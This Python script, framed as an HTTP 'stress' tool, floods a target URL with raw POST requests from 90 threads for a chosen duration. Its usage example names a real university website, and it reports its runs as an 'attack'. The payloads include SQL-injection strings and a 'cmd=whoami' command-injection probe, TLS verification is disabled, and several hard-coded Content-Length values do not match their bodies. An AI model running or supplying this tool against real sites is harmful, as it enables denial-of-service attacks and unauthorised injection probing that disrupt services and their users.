#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
stress_rawpost.py - Raw TCP POST stress tool (URL-only)
Usage: python3 stress_rawpost.py <target_url> <duration_seconds>
Example: python3 stress_rawpost.py https://www.ucv.edu.ph 90
"""

import socket
import ssl
import threading
import time
import sys
import random
import urllib.parse
import platform
from concurrent.futures import ThreadPoolExecutor

# ===== PLATFORM TWEAKS =====
IS_WINDOWS = platform.system().lower() == "windows"
SOCKET_TIMEOUT = 8.0 if IS_WINDOWS else 5.0

# ===== CONFIG =====
THREADS_PER_WORKER = 45   # 2 workers * 45 = 90 threads
WORKER_COUNT = 2

# Raw POST payloads (minimal, no extra headers)
POST_PAYLOADS = [
    b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\n\r\ntest",
    b"POST /login HTTP/1.1\r\nHost: target\r\nContent-Length: 18\r\n\r\nuser=admin&pass=123",
    b"POST /search HTTP/1.1\r\nHost: target\r\nContent-Length: 20\r\n\r\nq=union+select+1,2,3",
    b"POST /api HTTP/1.1\r\nHost: target\r\nContent-Length: 16\r\n\r\n{\"key\":\"value\"}",
    b"POST /submit HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\ndata=test",
    b"POST /upload HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\n\r\n",
    b"POST /cmd HTTP/1.1\r\nHost: target\r\nContent-Length: 12\r\n\r\ncmd=whoami",
    b"POST /db HTTP/1.1\r\nHost: target\r\nContent-Length: 22\r\n\r\nquery=SELECT+*+FROM+users",
]

class RawPOSTStress:
    def __init__(self, url, duration):
        parsed = urllib.parse.urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query
        self.ssl_flag = parsed.scheme == "https"
        self.duration = duration
        self.running = True
        self.total_requests = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = None

    def build_payload(self):
        payload = random.choice(POST_PAYLOADS)
        # Replace Host header and path
        payload = payload.replace(b"target", self.host.encode())
        # Replace / with actual path
        payload = payload.replace(b"POST / ", f"POST {self.path} ".encode())
        payload = payload.replace(b"POST /login", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /search", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /api", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /submit", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /upload", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /cmd", f"POST {self.path}".encode())
        payload = payload.replace(b"POST /db", f"POST {self.path}".encode())
        return payload

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            if IS_WINDOWS:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            if self.ssl_flag:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                sock = context.wrap_socket(sock, server_hostname=self.host)
            sock.connect((self.host, self.port))
            return sock
        except:
            return None

    def send_request(self, sock):
        payload = self.build_payload()
        try:
            sock.send(payload)
            sock.settimeout(0.5)
            try:
                sock.recv(4096)
            except:
                pass
            with self.lock:
                self.total_requests += 1
            return True
        except:
            with self.lock:
                self.errors += 1
            return False

    def worker_session(self, worker_id):
        sockets = [self.create_socket() for _ in range(THREADS_PER_WORKER)]

        def worker_thread(sock):
            while self.running:
                if sock is None:
                    sock = self.create_socket()
                    if sock is None:
                        time.sleep(0.2)
                        continue
                if not self.send_request(sock):
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None

        threads = []
        for sock in sockets:
            t = threading.Thread(target=worker_thread, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.running = False
        for t in threads:
            try:
                t.join(timeout=1)
            except:
                pass
        for sock in sockets:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def run(self):
        print(f"[+] Target: {self.host}:{self.port}{self.path}")
        print("[+] Attack sent (raw POST).")
        self.start_time = time.time()
        with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = [executor.submit(self.worker_session, i) for i in range(WORKER_COUNT)]
            try:
                for f in futures:
                    f.result()
            except:
                pass

        elapsed = time.time() - self.start_time
        with self.lock:
            reqs = self.total_requests
            errs = self.errors
        print(f"[+] Attack finished.")
        print(f"[+] Total requests sent: {reqs}")
        print(f"[+] Total errors: {errs}")
        if elapsed > 0:
            print(f"[+] Requests/sec: {reqs / elapsed:.2f}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 stress_rawpost.py <target_url> <duration_seconds>")
        print("Example: python3 stress_rawpost.py https://www.ucv.edu.ph 90")
        print("Example: python3 stress_rawpost.py http://192.168.1.1:8080 60")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print("[!] Duration must be an integer (seconds)")
        sys.exit(1)

    stress = RawPOSTStress(url, duration)
    stress.run()

if __name__ == "__main__":
    main()
